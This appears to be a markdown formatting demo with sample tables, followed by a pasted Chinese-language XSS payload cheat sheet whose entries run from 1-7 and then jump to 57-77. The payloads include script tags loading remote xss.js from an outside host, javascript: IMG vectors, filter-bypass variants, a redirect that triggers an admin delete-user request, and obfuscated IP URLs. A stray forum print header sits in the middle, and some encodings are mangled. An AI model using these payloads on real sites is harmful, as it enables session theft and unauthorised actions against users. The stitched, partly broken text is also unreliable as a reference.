

## Tables and alignment

First Header | Second Header
------------ | -------------
Content from cell 1 | Content from cell 2
Content in the first column | Content in the second column

| Left-Aligned  | Center Aligned  | Right Aligned |
| :------------ |:---------------:| -----:|
| col 3 is      | some wordy text | $1600 |
| col 2 is      | centered        |   $12 |


```
(1)普通的XSS JavaScript注入

<SCRIPT SRC=http://3w.org/XSS/xss.js></SCRIPT>
(2)IMG标签XSS使用JavaScript命令

<IMG SRC=http://3w.org/XSS/xss.js/>
(3)IMG标签无分号无引号

<IMG SRC=javascript:alert('XSS')>
(4)IMG标签大小写不敏感

<IMG SRC=JaVaScRiPt:alert('XSS')>
(5)HTML编码(必须有分号)

<IMG SRC=javascript:alert("XSS")>
(6)修正缺陷IMG标签

<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
(7)formCharCode标签(计算器)

(57)XML namespace.HTC文件必须和你的XSS载体在一台服务器上

<HTML xmlns:xss>
<?import namespace="xss" implementation="http://3w.org/XSS/xss.htc">
<xss:xss>XSS</xss:xss>
</HTML>
(58)如果过滤了你的JS你可以在图片里添加JS代码来利用

<SCRIPT SRC=""></SCRIPT>
(59)IMG嵌入式命令,可执行任意命令

<IMG SRC="http://www.a.com/a.php?a=b">
(60)IMG嵌入式命令(a.jpg在同服务器)

Redirect 302 /a.jpg http://www.XXX.com/admin.asp&deleteuser
(61)绕符号过滤

<SCRIPT a=">" SRC="http://3w.org/xss.js"></SCRIPT>
(62)

<SCRIPT =">" SRC="http://3w.org/xss.js"></SCRIPT>
(63)

<SCRIPT a=">" " SRC="http://3w.org/xss.js"></SCRIPT>
(64)

<SCRIPT "a='>'" SRC="http://3w.org/xss.js"></SCRIPT>
(65)

<SCRIPT a=`>` SRC="http://3w.org/xss.js"></SCRIPT>
(66)12-7-1 T00LS - Powered by Discuz! Board

https://www.a.com/viewthread.php?action=printable&tid=15267 4/6
<SCRIPT a=">'>" SRC="http://3w.org/xss.js"></SCRIPT>
(67)

<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://3w.org/xss.js">
</SCRIPT>
(68)URL绕行

<A HREF="http://127.0.0.1/">XSS</A>
(69)URL编码

<A HREF="http://3w.org">XSS</A>
(70)IP十进制

<A HREF="http://3232235521″>XSS</A>
(71)IP十六进制

<A HREF="http://0xc0.0xa8.0×00.0×01″>XSS</A>
(72)IP八进制

<A HREF="http://0300.0250.0000.0001″>XSS</A>
(73)混合编码

<A HREF="h
tt p://6 6.000146.0×7.147/"">XSS</A>
(74)节省[http:]

<A HREF="//www.google.com/">XSS</A>
(75)节省[www]

<A HREF="http://google.com/">XSS</A>
(76)绝对点绝对DNS

<A HREF="http://www.google.com./">XSS</A>
(77)javascript链接

<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```
